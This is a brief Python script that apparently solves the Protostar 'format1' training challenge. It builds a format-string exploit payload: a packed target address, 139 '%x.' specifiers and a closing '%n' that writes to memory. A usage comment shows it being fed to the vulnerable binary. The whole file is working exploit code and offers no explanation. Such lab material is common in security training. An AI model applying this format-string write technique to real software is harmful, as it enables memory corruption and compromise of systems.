########################################
# Usage:
# /opt/protostar/bin/format1 $(python format1.py)
########################################
import struct

lettersBeginning = 'AAAAAA'
address = struct.pack("I", 0x08049638)
lettersEnd = 'BBB'
padding = '%x.' * 139 + '%n'

payload = lettersBeginning + address + lettersEnd + padding
print(payload)
